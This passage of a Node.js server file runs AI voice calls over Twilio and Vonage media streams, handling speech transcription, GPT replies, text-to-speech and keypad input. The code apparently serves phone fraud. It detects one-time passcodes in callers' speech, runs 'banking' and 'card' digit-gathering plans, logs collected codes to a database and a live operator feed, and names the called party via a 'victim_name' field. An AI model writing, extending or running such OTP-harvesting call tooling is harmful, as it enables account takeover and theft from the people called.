              const isGroupedGather = Boolean(
                activePlan &&
                ["banking", "card"].includes(activePlan.group_id) &&
                activePlan.capture_mode === "ivr_gather",
              );
              const fallbackPrompt = "One moment while I pull that up.";
              if (isGroupedGather) {
                const firstMessage =
                  callConfig && callConfig.first_message
                    ? callConfig.first_message
                    : fallbackPrompt;
                const preamble = callConfig?.initial_prompt_played
                  ? ""
                  : firstMessage;
                if (callConfig) {
                  callConfig.initial_prompt_played = true;
                  callConfigurations.set(callSid, callConfig);
                }
                if (preamble) {
                  try {
                    await db.addTranscript({
                      call_sid: callSid,
                      speaker: "ai",
                      message: preamble,
                      interaction_count: 0,
                      personality_used: "default",
                    });
                  } catch (dbError) {
                    console.error(
                      "Database error adding initial transcript:",
                      dbError,
                    );
                  }
                  webhookService.recordTranscriptTurn(
                    callSid,
                    "agent",
                    preamble,
                  );
                }
                startGroupedGather(callSid, callConfig, {
                  preamble,
                  gptService,
                  interactionCount,
                });
                scheduleSilenceTimer(callSid);
                isInitialized = true;
                if (pendingDigitActions.length) {
                  await handlePendingDigitActions(
                    callSid,
                    pendingDigitActions,
                    gptService,
                    interactionCount,
                  );
                }
                console.log("Adaptive call initialization complete");
                return;
              }

              const firstMessage =
                callConfig && callConfig.first_message
                  ? callConfig.first_message
                  : initialExpectation
                    ? digitService.buildDigitPrompt(initialExpectation)
                    : fallbackPrompt;

              console.log(
                `First message (${functionSystem?.context.industry || "default"}): ${firstMessage.substring(0, 50)}...`,
              );
              let promptUsed = firstMessage;
              try {
                await ttsService.generate(
                  {
                    partialResponseIndex: null,
                    partialResponse: firstMessage,
                  },
                  0,
                );
              } catch (ttsError) {
                console.error("Initial TTS error:", ttsError);
                try {
                  await ttsService.generate(
                    {
                      partialResponseIndex: null,
                      partialResponse: fallbackPrompt,
                    },
                    0,
                  );
                  promptUsed = fallbackPrompt;
                } catch (fallbackError) {
                  console.error("Initial TTS fallback error:", fallbackError);
                  await speakAndEndCall(
                    callSid,
                    CALL_END_MESSAGES.error,
                    "tts_error",
                  );
                  isInitialized = true;
                  return;
                }
              }

              try {
                await db.addTranscript({
                  call_sid: callSid,
                  speaker: "ai",
                  message: promptUsed,
                  interaction_count: 0,
                  personality_used: "default",
                });
              } catch (dbError) {
                console.error(
                  "Database error adding initial transcript:",
                  dbError,
                );
              }
              if (callConfig) {
                callConfig.initial_prompt_played = true;
                callConfigurations.set(callSid, callConfig);
              }
              if (digitService?.hasExpectation(callSid) && !isGroupedGather) {
                digitService.markDigitPrompted(
                  callSid,
                  gptService,
                  interactionCount,
                  "dtmf",
                  {
                    allowCallEnd: true,
                    prompt_text: promptUsed,
                  },
                );
                digitService.scheduleDigitTimeout(callSid, gptService, 0);
              }
              scheduleSilenceTimer(callSid);
              startGroupedGather(callSid, callConfig, {
                preamble: "",
                delayMs: estimateSpeechDurationMs(promptUsed) + 200,
                gptService,
                interactionCount,
              });

              isInitialized = true;
              if (pendingDigitActions.length) {
                await handlePendingDigitActions(
                  callSid,
                  pendingDigitActions,
                  gptService,
                  interactionCount,
                );
              }
              console.log("Adaptive call initialization complete");
            }
          } catch (recordingError) {
            console.error("Recording service error:", recordingError);
            if (skipGreeting) {
              isInitialized = true;
              console.log(
                `Stream reconnected for ${callSid} (skipping greeting)`,
              );
              if (pendingDigitActions.length) {
                await handlePendingDigitActions(
                  callSid,
                  pendingDigitActions,
                  gptService,
                  interactionCount,
                );
              }
              startGroupedGather(callSid, callConfig, {
                preamble: "",
                gptService,
                interactionCount,
              });
            } else {
              const initialExpectation = digitService?.getExpectation(callSid);
              const activePlan = digitService?.getPlan
                ? digitService.getPlan(callSid)
                : null;
              const isGroupedGather = Boolean(
                activePlan &&
                ["banking", "card"].includes(activePlan.group_id) &&
                activePlan.capture_mode === "ivr_gather",
              );
              const fallbackPrompt = "One moment while I pull that up.";
              if (isGroupedGather) {
                const firstMessage =
                  callConfig && callConfig.first_message
                    ? callConfig.first_message
                    : fallbackPrompt;
                const preamble = callConfig?.initial_prompt_played
                  ? ""
                  : firstMessage;
                if (callConfig) {
                  callConfig.initial_prompt_played = true;
                  callConfigurations.set(callSid, callConfig);
                }
                if (preamble) {
                  try {
                    await db.addTranscript({
                      call_sid: callSid,
                      speaker: "ai",
                      message: preamble,
                      interaction_count: 0,
                      personality_used: "default",
                    });
                  } catch (dbError) {
                    console.error(
                      "Database error adding initial transcript:",
                      dbError,
                    );
                  }
                  webhookService.recordTranscriptTurn(
                    callSid,
                    "agent",
                    preamble,
                  );
                }
                startGroupedGather(callSid, callConfig, {
                  preamble,
                  gptService,
                  interactionCount,
                });
                scheduleSilenceTimer(callSid);
                isInitialized = true;
                return;
              }

              const firstMessage =
                callConfig && callConfig.first_message
                  ? callConfig.first_message
                  : initialExpectation
                    ? digitService.buildDigitPrompt(initialExpectation)
                    : fallbackPrompt;

              let promptUsed = firstMessage;
              try {
                await ttsService.generate(
                  {
                    partialResponseIndex: null,
                    partialResponse: firstMessage,
                  },
                  0,
                );
              } catch (ttsError) {
                console.error("Initial TTS error:", ttsError);
                try {
                  await ttsService.generate(
                    {
                      partialResponseIndex: null,
                      partialResponse: fallbackPrompt,
                    },
                    0,
                  );
                  promptUsed = fallbackPrompt;
                } catch (fallbackError) {
                  console.error("Initial TTS fallback error:", fallbackError);
                  await speakAndEndCall(
                    callSid,
                    CALL_END_MESSAGES.error,
                    "tts_error",
                  );
                  isInitialized = true;
                  return;
                }
              }

              try {
                await db.addTranscript({
                  call_sid: callSid,
                  speaker: "ai",
                  message: promptUsed,
                  interaction_count: 0,
                  personality_used: "default",
                });
              } catch (dbError) {
                console.error("Database error adding AI transcript:", dbError);
              }
              if (callConfig) {
                callConfig.initial_prompt_played = true;
                callConfigurations.set(callSid, callConfig);
              }
              if (digitService?.hasExpectation(callSid) && !isGroupedGather) {
                digitService.markDigitPrompted(
                  callSid,
                  gptService,
                  interactionCount,
                  "dtmf",
                  {
                    allowCallEnd: true,
                    prompt_text: promptUsed,
                  },
                );
                digitService.scheduleDigitTimeout(callSid, gptService, 0);
              }
              scheduleSilenceTimer(callSid);
              startGroupedGather(callSid, callConfig, {
                preamble: "",
                delayMs: estimateSpeechDurationMs(promptUsed) + 200,
                gptService,
                interactionCount,
              });

              isInitialized = true;
            }
          }

          // Clean up old configurations
          const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
          for (const [sid, config] of callConfigurations.entries()) {
            if (new Date(config.created_at) < oneHourAgo) {
              callConfigurations.delete(sid);
              callFunctionSystems.delete(sid);
              callDirections.delete(sid);
              activeStreamConnections.delete(sid);
            }
          }
        } else if (event === "media") {
          if (!streamAuthOk) {
            return;
          }
          if (isInitialized && transcriptionService) {
            const now = Date.now();
            streamLastMediaAt.set(callSid, now);
            if (shouldSampleUserAudioLevel(callSid, now)) {
              const level = estimateAudioLevelFromBase64(
                msg?.media?.payload || "",
              );
              updateUserAudioLevel(callSid, level, now);
            }
            markStreamMediaSeen(callSid);
            transcriptionService.send(msg.media.payload);
          }
        } else if (event === "mark") {
          const label = msg.mark.name;
          marks = marks.filter((m) => m !== msg.mark.name);
        } else if (event === "dtmf") {
          const digits = msg?.dtmf?.digits || msg?.dtmf?.digit || "";
          if (digits) {
            clearSilenceTimer(callSid);
            markStreamMediaSeen(callSid);
            streamLastMediaAt.set(callSid, Date.now());
            const callConfig = callConfigurations.get(callSid);
            const captureActive = isCaptureActiveConfig(callConfig);
            let isDigitIntent =
              callConfig?.digit_intent?.mode === "dtmf" || captureActive;
            if (!isDigitIntent && callConfig && digitService) {
              const hasExplicitDigitConfig = !!(
                callConfig.collection_profile ||
                callConfig.script_policy?.requires_otp ||
                callConfig.script_policy?.default_profile
              );
              if (hasExplicitDigitConfig) {
                await applyInitialDigitIntent(
                  callSid,
                  callConfig,
                  gptService,
                  interactionCount,
                );
                isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
              }
            }
            const shouldBuffer =
              isDigitIntent ||
              digitService?.hasPlan?.(callSid) ||
              digitService?.hasExpectation?.(callSid);
            if (!isDigitIntent && !shouldBuffer) {
              webhookService.addLiveEvent(
                callSid,
                `🔢 Keypad: ${digits} (ignored - normal flow)`,
                { force: true },
              );
              return;
            }
            const expectation = digitService?.getExpectation(callSid);
            const activePlan = digitService?.getPlan?.(callSid);
            const planStepIndex = Number.isFinite(activePlan?.index)
              ? activePlan.index + 1
              : null;
            console.log(
              `Media DTMF for ${callSid}: ${maskDigitsForLog(digits)} (expectation ${expectation ? "present" : "missing"})`,
            );
            if (!expectation) {
              if (digitService?.bufferDigits) {
                digitService.bufferDigits(callSid, digits, {
                  timestamp: Date.now(),
                  source: "dtmf",
                  early: true,
                  plan_id: activePlan?.id || null,
                  plan_step_index: planStepIndex,
                });
              }
              webhookService.addLiveEvent(
                callSid,
                `🔢 Keypad: ${digits} (buffered early)`,
                { force: true },
              );
              return;
            }
            await digitService.flushBufferedDigits(
              callSid,
              gptService,
              interactionCount,
              "dtmf",
              { allowCallEnd: true },
            );
            if (!digitService?.hasExpectation(callSid)) {
              return;
            }
            const activeExpectation = digitService.getExpectation(callSid);
            const display =
              activeExpectation?.profile === "verification"
                ? digitService.formatOtpForDisplay(
                    digits,
                    "progress",
                    activeExpectation?.max_digits,
                  )
                : `Keypad: ${digits}`;
            webhookService.addLiveEvent(callSid, `🔢 ${display}`, {
              force: true,
            });
            const collection = digitService.recordDigits(callSid, digits, {
              timestamp: Date.now(),
              source: "dtmf",
              attempt_id: activeExpectation?.attempt_id || null,
              plan_id: activeExpectation?.plan_id || null,
              plan_step_index: activeExpectation?.plan_step_index || null,
            });
            await digitService.handleCollectionResult(
              callSid,
              collection,
              gptService,
              interactionCount,
              "dtmf",
              { allowCallEnd: true },
            );
          }
        } else if (event === "stop") {
          console.log(`Adaptive call stream ${streamSid} ended`.red);
          const stopKey = `${callSid || "unknown"}:${streamSid || "unknown"}`;
          if (streamStopSeen.has(stopKey)) {
            console.log(`Duplicate stream stop ignored for ${stopKey}`);
            return;
          }
          streamStopSeen.add(stopKey);
          clearFirstMediaWatchdog(callSid);
          streamFirstMediaSeen.delete(callSid);
          streamStartTimes.delete(callSid);
          if (pendingStreams.has(callSid)) {
            clearTimeout(pendingStreams.get(callSid));
            pendingStreams.delete(callSid);
          }
          if (
            callSid &&
            activeStreamConnections.get(callSid)?.streamSid === streamSid
          ) {
            activeStreamConnections.delete(callSid);
          }

          const activePlan = digitService?.getPlan?.(callSid);
          const isGatherPlan = activePlan?.capture_mode === "ivr_gather";
          if (digitService?.isFallbackActive?.(callSid) || isGatherPlan) {
            const reason = digitService?.isFallbackActive?.(callSid)
              ? "Gather fallback"
              : "IVR gather";
            console.log(
              `📟 Stream stopped during ${reason} for ${callSid}; preserving call state.`,
            );
            activeCalls.delete(callSid);
            clearCallEndLock(callSid);
            clearSilenceTimer(callSid);
            return;
          }

          const authBypass = streamAuthBypass.get(callSid);
          if (authBypass && !streamFirstMediaSeen.has(callSid)) {
            console.warn(
              `Stream stopped before auth for ${callSid} (${authBypass.reason})`,
            );
            webhookService.addLiveEvent(
              callSid,
              "⚠️ Stream stopped before auth; attempting recovery",
              { force: true },
            );
            await db
              .updateCallState(callSid, "stream_stopped_before_auth", {
                reason: authBypass.reason,
                stream_sid: streamSid || null,
                at: new Date().toISOString(),
              })
              .catch(() => {});
            void handleStreamTimeout(callSid, host, {
              allowHangup: false,
              reason: "stream_auth_failed",
            });
            clearCallEndLock(callSid);
            clearSilenceTimer(callSid);
            return;
          }

          await handleCallEnd(callSid, callStartTime);

          // Clean up
          activeCalls.delete(callSid);
          if (callSid && callConfigurations.has(callSid)) {
            callConfigurations.delete(callSid);
            callFunctionSystems.delete(callSid);
            callDirections.delete(callSid);
            console.log(
              `Cleaned up adaptive configuration for call: ${callSid}`,
            );
          }
          if (callSid) {
            streamStartSeen.delete(callSid);
            streamAuthBypass.delete(callSid);
            streamRetryState.delete(callSid);
            purgeStreamStatusDedupe(callSid);
            streamLastMediaAt.delete(callSid);
            sttLastFrameAt.delete(callSid);
            streamWatchdogState.delete(callSid);
          }
          if (digitService) {
            digitService.clearCallState(callSid);
          }
          clearCallEndLock(callSid);
          clearSilenceTimer(callSid);
        } else {
          console.log(
            `Unrecognized WS event for ${callSid || "unknown"}: ${event || "none"}`,
            msg,
          );
        }
      } catch (messageError) {
        console.error("Error processing WebSocket message:", messageError);
      }
    });

    transcriptionService.on("utterance", async (text) => {
      clearSilenceTimer(callSid);
      if (callSid) {
        sttLastFrameAt.set(callSid, Date.now());
      }
      if (text && text.trim().length > 0) {
        webhookService
          .setLiveCallPhase(callSid, "user_speaking")
          .catch(() => {});
      }
      if (marks.length > 0 && text?.length > 5) {
        console.log("Interruption detected, clearing stream".red);
        ws.send(
          JSON.stringify({
            streamSid,
            event: "clear",
          }),
        );
      }
    });

    transcriptionService.on("transcription", async (text) => {
      if (!text || !gptService || !isInitialized) {
        return;
      }
      clearSilenceTimer(callSid);
      if (callSid) {
        sttLastFrameAt.set(callSid, Date.now());
      }

      const callConfig = callConfigurations.get(callSid);
      const isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
      const captureActive = isCaptureActiveConfig(callConfig);
      const otpContext = digitService.getOtpContext(text, callSid);
      console.log(`Customer: ${otpContext.maskedForLogs}`);

      // Save user transcript with enhanced context
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: "user",
          message: otpContext.raw,
          interaction_count: interactionCount,
        });

        await db.updateCallState(callSid, "user_spoke", {
          message: otpContext.raw,
          interaction_count: interactionCount,
          otp_detected: otpContext.otpDetected,
          last_collected_code: otpContext.codes?.slice(-1)[0] || null,
          collected_codes: otpContext.codes?.join(", ") || null,
        });
      } catch (dbError) {
        console.error("Database error adding user transcript:", dbError);
      }

      webhookService.recordTranscriptTurn(callSid, "user", otpContext.raw);
      if (
        (isDigitIntent || captureActive) &&
        otpContext.codes &&
        otpContext.codes.length &&
        digitService?.hasExpectation(callSid)
      ) {
        const activeExpectation = digitService.getExpectation(callSid);
        const progress = digitService.formatOtpForDisplay(
          otpContext.codes[otpContext.codes.length - 1],
          "progress",
          activeExpectation?.max_digits,
        );
        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
        const collection = digitService.recordDigits(
          callSid,
          otpContext.codes[otpContext.codes.length - 1],
          {
            timestamp: Date.now(),
            source: "spoken",
            full_input: true,
            attempt_id: activeExpectation?.attempt_id || null,
            plan_id: activeExpectation?.plan_id || null,
            plan_step_index: activeExpectation?.plan_step_index || null,
          },
        );
        await digitService.handleCollectionResult(
          callSid,
          collection,
          gptService,
          interactionCount,
          "spoken",
          { allowCallEnd: true },
        );
      }
      if (captureActive) {
        return;
      }

      if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
        interactionCount += 1;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }

      if (
        shouldCloseConversation(otpContext.maskedForGpt) &&
        interactionCount >= 1
      ) {
        await speakAndEndCall(
          callSid,
          CALL_END_MESSAGES.user_goodbye,
          "user_goodbye",
        );
        interactionCount += 1;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }

      const getInteractionCount = () => interactionCount;
      const setInteractionCount = (nextCount) => {
        interactionCount = nextCount;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = nextCount;
        }
      };
      if (isDigitIntent) {
        await enqueueGptTask(callSid, async () => {
          const currentCount = interactionCount;
          try {
            await gptService.completion(otpContext.maskedForGpt, currentCount);
          } catch (gptError) {
            console.error("GPT completion error:", gptError);
            webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
              force: true,
            });
          }
          setInteractionCount(currentCount + 1);
        });
        return;
      }
      await processNormalFlowTranscript(
        callSid,
        otpContext.maskedForGpt,
        gptService,
        getInteractionCount,
        setInteractionCount,
      );
    });

    ttsService.on("speech", (responseIndex, audio, label, icount) => {
      const level = estimateAudioLevelFromBase64(audio);
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking", { level })
        .catch(() => {});
      if (digitService?.hasExpectation(callSid)) {
        digitService.updatePromptDelay(
          callSid,
          estimateAudioDurationMsFromBase64(audio),
        );
      }
      if (callSid) {
        db.updateCallState(callSid, "tts_ready", {
          response_index: responseIndex,
          interaction_count: icount,
          audio_bytes: audio?.length || null,
        }).catch(() => {});
      }
      streamService.buffer(responseIndex, audio);
    });

    streamService.on("audiosent", (markLabel) => {
      marks.push(markLabel);
    });
    streamService.on("audiotick", (tick) => {
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking", {
          level: tick?.level,
          logEvent: false,
        })
        .catch(() => {});
    });

    ws.on("close", () => {
      console.log(
        `WebSocket connection closed for adaptive call: ${callSid || "unknown"}`,
      );
      if (digitService) {
        digitService.clearCallState(callSid);
      }
      clearSpeechTicks(callSid);
      clearGptQueue(callSid);
      clearNormalFlowState(callSid);
      clearCallEndLock(callSid);
      clearSilenceTimer(callSid);
      sttFallbackCalls.delete(callSid);
      streamTimeoutCalls.delete(callSid);
      streamStartTimes.delete(callSid);
      sttFailureCounts.delete(callSid);
      if (callSid && activeStreamConnections.get(callSid)?.ws === ws) {
        activeStreamConnections.delete(callSid);
      }
      if (callSid) {
        if (pendingStreams.has(callSid)) {
          clearTimeout(pendingStreams.get(callSid));
          pendingStreams.delete(callSid);
        }
        streamStartSeen.delete(callSid);
        streamAuthBypass.delete(callSid);
        streamRetryState.delete(callSid);
        purgeStreamStatusDedupe(callSid);
        streamLastMediaAt.delete(callSid);
        sttLastFrameAt.delete(callSid);
        streamWatchdogState.delete(callSid);
        if (streamSid) {
          streamStopSeen.delete(`${callSid}:${streamSid}`);
        }
      }
    });
  } catch (err) {
    console.error("WebSocket handler error:", err);
  }
});

// Vonage websocket media handler (bidirectional PCM stream)
app.ws("/vonage/stream", async (ws, req) => {
  try {
    const vonageUuid =
      req.query?.uuid || req.query?.conversation_uuid || req.query?.vonage_uuid;
    let callSid = req.query?.callSid;
    if (!callSid && vonageUuid) {
      callSid = await resolveVonageCallSidFromUuid(vonageUuid);
    }
    if (!callSid) {
      console.warn("Vonage websocket missing callSid; closing connection", {
        uuid: vonageUuid || null,
      });
      ws.close();
      return;
    }

    const streamAuth = verifyStreamAuth(callSid, req);
    if (!streamAuth.ok) {
      console.warn("Vonage websocket auth failed", {
        callSid,
        reason: streamAuth.reason || "invalid",
      });
      ws.close();
      return;
    }

    if (vonageUuid) {
      rememberVonageCallMapping(callSid, vonageUuid, "stream_open");
    }

    let interactionCount = 0;
    let callConfig = callConfigurations.get(callSid);
    let functionSystem = callFunctionSystems.get(callSid);
    if (!callConfig) {
      const hydrated = await hydrateCallConfigFromDb(callSid);
      callConfig = hydrated?.callConfig || callConfig;
      functionSystem = hydrated?.functionSystem || functionSystem;
    }
    if (!callConfig && callSid) {
      const callRecord = db?.getCall
        ? await db.getCall(callSid).catch(() => null)
        : null;
      if (callRecord) {
        const setup = ensureCallSetup(callSid, {
          From: callRecord.phone_number || null,
          To: null,
        }, {
          provider: "vonage",
          inbound: callDirections.get(callSid) !== "outbound",
        });
        callConfig = setup.callConfig || callConfig;
        functionSystem = setup.functionSystem || functionSystem;
      }
    }
    if (!callConfig) {
      console.warn(`Vonage websocket missing call configuration for ${callSid}`);
      ws.close();
      return;
    }
    if (!functionSystem) {
      functionSystem = functionEngine.generateAdaptiveFunctionSystem(
        callConfig?.prompt || DEFAULT_INBOUND_PROMPT,
        callConfig?.first_message || DEFAULT_INBOUND_FIRST_MESSAGE,
      );
      callFunctionSystems.set(callSid, functionSystem);
    }
    if (!callConfig.provider_metadata) {
      callConfig.provider_metadata = {};
    }
    if (vonageUuid && callConfig.provider_metadata.vonage_uuid !== vonageUuid) {
      callConfig.provider_metadata.vonage_uuid = String(vonageUuid);
    }
    const directionHint =
      req.query?.direction ||
      req.query?.Direction ||
      callDirections.get(callSid) ||
      (callConfig.inbound ? "inbound" : "outbound");
    const isInboundCall = !isOutboundVonageDirection(directionHint);
    callConfig.provider = "vonage";
    callConfig.inbound = isInboundCall;
    callConfigurations.set(callSid, callConfig);
    callDirections.set(callSid, isInboundCall ? "inbound" : "outbound");

    const vonageAudioSpec = getVonageWebsocketAudioSpec();
    const startedAt = new Date().toISOString();
    if (db?.updateCallStatus) {
      await db
        .updateCallStatus(callSid, "started", { started_at: startedAt })
        .catch(() => {});
    }
    if (db?.updateCallState) {
      await db.updateCallState(callSid, "stream_started", {
        stream_provider: "vonage",
        started_at: startedAt,
        vonage_uuid: vonageUuid || callConfig?.provider_metadata?.vonage_uuid,
        stream_audio_content_type: vonageAudioSpec.contentType,
        stream_audio_encoding: vonageAudioSpec.sttEncoding,
        stream_audio_sample_rate: vonageAudioSpec.sampleRate,
      })
        .catch(() => {});
    }
    const voiceAgentMode = resolveVoiceAgentExecutionMode();
    const keypadRequiredFlow = isKeypadRequiredFlow(
      callConfig?.collection_profile,
      callConfig?.script_policy,
    );
    if (voiceAgentMode.enabled && !keypadRequiredFlow) {
      const voiceAgentStart = await tryStartVonageVoiceAgentSession({
        ws,
        req,
        callSid,
        callConfig,
        functionSystem,
        vonageUuid,
        vonageAudioSpec,
      });
      if (voiceAgentStart?.started) {
        return;
      }
      const fallbackReason =
        voiceAgentStart?.error?.message ||
        voiceAgentStart?.reason ||
        voiceAgentMode.reason;
      console.warn(
        `Vonage voice agent unavailable for ${callSid}; using legacy STT+GPT+TTS (${fallbackReason})`,
      );
      webhookService.addLiveEvent(
        callSid,
        "⚠️ Voice agent unavailable. Using legacy STT+GPT+TTS pipeline…",
        { force: true },
      );
      if (db?.updateCallState) {
        await db
          .updateCallState(callSid, "voice_agent_connect_failed", {
            at: new Date().toISOString(),
            provider: "vonage",
            error: fallbackReason,
          })
          .catch(() => {});
      }
    } else if (keypadRequiredFlow && voiceAgentMode.enabled) {
      console.log(
        `Vonage voice agent bypassed for keypad-required flow on ${callSid}; using legacy STT+GPT+TTS`,
      );
    } else if (voiceAgentMode.requested && !voiceAgentMode.enabled) {
      console.log(
        `Vonage voice agent unavailable (${voiceAgentMode.reason}); using legacy STT+GPT+TTS pipeline`,
      );
    }

    const ttsService = new TextToSpeechService({
      encoding: vonageAudioSpec.ttsEncoding,
      sampleRate: vonageAudioSpec.sampleRate,
    });
    ttsService
      .generate(
        { partialResponseIndex: null, partialResponse: "warming up" },
        -1,
        { silent: true },
      )
      .catch(() => {});
    const transcriptionService = new TranscriptionService({
      encoding: vonageAudioSpec.sttEncoding,
      sampleRate: vonageAudioSpec.sampleRate,
    });

    const handleSttFailure = async (tag, error) => {
      if (!callSid) return;
      console.error(
        `STT failure (${tag}) for ${callSid}`,
        error?.message || error || "",
      );
      const session = activeCalls.get(callSid);
      await activateDtmfFallback(
        callSid,
        callConfig,
        gptService,
        session?.interactionCount || interactionCount,
        tag,
      );
    };

    transcriptionService.on("error", (error) => {
      handleSttFailure("stt_error", error);
    });
    transcriptionService.on("close", () => {
      handleSttFailure("stt_closed");
    });

    let gptService;
    if (functionSystem) {
      gptService = new EnhancedGptService(
        callConfig?.prompt,
        callConfig?.first_message,
      );
    } else {
      gptService = new EnhancedGptService(
        callConfig?.prompt,
        callConfig?.first_message,
      );
    }

    gptService.setCallSid(callSid);
    gptService.setCustomerName(
      callConfig?.customer_name || callConfig?.victim_name,
    );
    gptService.setCallProfile(
      callConfig?.purpose || callConfig?.business_context?.purpose,
    );
    const intentLine = `Call intent: ${callConfig?.script || "general"} | purpose: ${callConfig?.purpose || "general"} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || "unspecified"}. Keep replies concise and on-task.`;
    gptService.setCallIntent(intentLine);
    await applyInitialDigitIntent(callSid, callConfig, gptService, 0);
    configureCallTools(gptService, callSid, callConfig, functionSystem);

    activeCalls.set(callSid, {
      startTime: new Date(),
      transcripts: [],
      gptService,
      callConfig,
      functionSystem,
      personalityChanges: [],
      ws,
      ttsService,
      interactionCount: 0,
    });
    clearKeypadCallState(callSid);
    scheduleVonageKeypadDtmfWatchdog(callSid, callConfig);

    let gptErrorCount = 0;
    gptService.on("gptreply", async (gptReply, icount) => {
      gptErrorCount = 0;
      const activeSession = activeCalls.get(callSid);
      if (activeSession?.ending) {
        return;
      }
      webhookService.recordTranscriptTurn(
        callSid,
        "agent",
        gptReply.partialResponse,
      );
      webhookService
        .setLiveCallPhase(callSid, "agent_responding")
        .catch(() => {});
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: "ai",
          message: gptReply.partialResponse,
          interaction_count: icount,
          personality_used: gptReply.personalityInfo?.name || "default",
          adaptation_data: JSON.stringify(gptReply.adaptationHistory || []),
        });
        await db.updateCallState(callSid, "ai_responded", {
          message: gptReply.partialResponse,
          interaction_count: icount,
        });
      } catch (dbError) {
        console.error("Database error adding AI transcript:", dbError);
      }

      await ttsService.generate(gptReply, icount);
      scheduleSilenceTimer(callSid);
    });

    gptService.on("stall", (fillerText) => {
      webhookService.addLiveEvent(callSid, "⏳ One moment…", { force: true });
      try {
        ttsService.generate(
          {
            partialResponse: fillerText,
            personalityInfo: { name: "filler" },
            adaptationHistory: [],
          },
          interactionCount,
        );
      } catch (err) {
        console.error("Filler TTS error:", err);
      }
    });

    gptService.on("gpterror", async (err) => {
      gptErrorCount += 1;
      const message = err?.message || "GPT error";
      webhookService.addLiveEvent(callSid, `⚠️ GPT error: ${message}`, {
        force: true,
      });
      if (gptErrorCount >= 2) {
        await speakAndEndCall(callSid, CALL_END_MESSAGES.error, "gpt_error");
      }
    });

    ttsService.on("speech", (responseIndex, audio) => {
      const level = estimateAudioLevelFromBase64(audio);
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking", { level })
        .catch(() => {});
      scheduleSpeechTicksFromAudio(callSid, "agent_speaking", audio);
      if (digitService?.hasExpectation(callSid)) {
        digitService.updatePromptDelay(
          callSid,
          estimateAudioDurationMsFromBase64(audio),
        );
      }
      if (callSid) {
        db.updateCallState(callSid, "tts_ready", {
          response_index: responseIndex,
          interaction_count: interactionCount,
          audio_bytes: audio?.length || null,
          provider: "vonage",
        }).catch(() => {});
      }
      try {
        const buffer = Buffer.from(audio, "base64");
        ws.send(buffer);
      } catch (error) {
        console.error("Vonage websocket send error:", error);
      }
    });

    transcriptionService.on("utterance", (text) => {
      clearSilenceTimer(callSid);
      if (text && text.trim().length > 0) {
        webhookService
          .setLiveCallPhase(callSid, "user_speaking")
          .catch(() => {});
      }
    });

    transcriptionService.on("transcription", async (text) => {
      if (!text) return;
      clearSilenceTimer(callSid);
      const callConfig = callConfigurations.get(callSid);
      const isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
      const captureActive = isCaptureActiveConfig(callConfig);
      const otpContext = digitService.getOtpContext(text, callSid);
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: "user",
          message: otpContext.raw,
          interaction_count: interactionCount,
        });
        await db.updateCallState(callSid, "user_spoke", {
          message: otpContext.raw,
          interaction_count: interactionCount,
          otp_detected: otpContext.otpDetected,
          last_collected_code: otpContext.codes?.slice(-1)[0] || null,
          collected_codes: otpContext.codes?.join(", ") || null,
        });
      } catch (dbError) {
        console.error("Database error adding user transcript:", dbError);
      }
      webhookService.recordTranscriptTurn(callSid, "user", otpContext.raw);
      if (
        (isDigitIntent || captureActive) &&
        otpContext.codes &&
        otpContext.codes.length &&
        digitService?.hasExpectation(callSid)
      ) {
        const activeExpectation = digitService.getExpectation(callSid);
        const progress = digitService.formatOtpForDisplay(
          otpContext.codes[otpContext.codes.length - 1],
          "progress",
          activeExpectation?.max_digits,
        );
        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
        const collection = digitService.recordDigits(
          callSid,
          otpContext.codes[otpContext.codes.length - 1],
          {
            timestamp: Date.now(),
            source: "spoken",
            full_input: true,
            attempt_id: activeExpectation?.attempt_id || null,
            plan_id: activeExpectation?.plan_id || null,
            plan_step_index: activeExpectation?.plan_step_index || null,
          },
        );
        await digitService.handleCollectionResult(
          callSid,
          collection,
          gptService,
          interactionCount,
          "spoken",
          { allowCallEnd: true },
        );
      }
      if (captureActive) {
        return;
      }
      if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
        interactionCount += 1;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }
      if (
        shouldCloseConversation(otpContext.maskedForGpt) &&
        interactionCount >= 1
      ) {
        await speakAndEndCall(
          callSid,
          CALL_END_MESSAGES.user_goodbye,
          "user_goodbye",
        );
        interactionCount += 1;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }
      const getInteractionCount = () => interactionCount;
      const setInteractionCount = (nextCount) => {
        interactionCount = nextCount;
        const session = activeCalls.get(callSid);
        if (session) {
          session.interactionCount = nextCount;
        }
      };
      if (isDigitIntent) {
        await enqueueGptTask(callSid, async () => {
          const currentCount = interactionCount;
          try {
            await gptService.completion(otpContext.maskedForGpt, currentCount);
          } catch (gptError) {
            console.error("GPT completion error:", gptError);
            webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
              force: true,
            });
          }
          setInteractionCount(currentCount + 1);
        });
        return;
      }
      await processNormalFlowTranscript(
        callSid,
        otpContext.maskedForGpt,
        gptService,
        getInteractionCount,
        setInteractionCount,
      );
    });

    ws.on("message", (data) => {
      if (!data) return;
      if (Buffer.isBuffer(data)) {
        transcriptionService.sendBuffer(data);
        return;
      }
      const str = data.toString();
      try {
        const parsed = JSON.parse(str);
        const wsDigits = getVonageDtmfDigits(parsed || {});
        if (wsDigits) {
          handleExternalDtmfInput(callSid, wsDigits, {
            source: "vonage_ws_dtmf",
            provider: "vonage",
            gptService,
            interactionCount,
          }).catch((error) => {
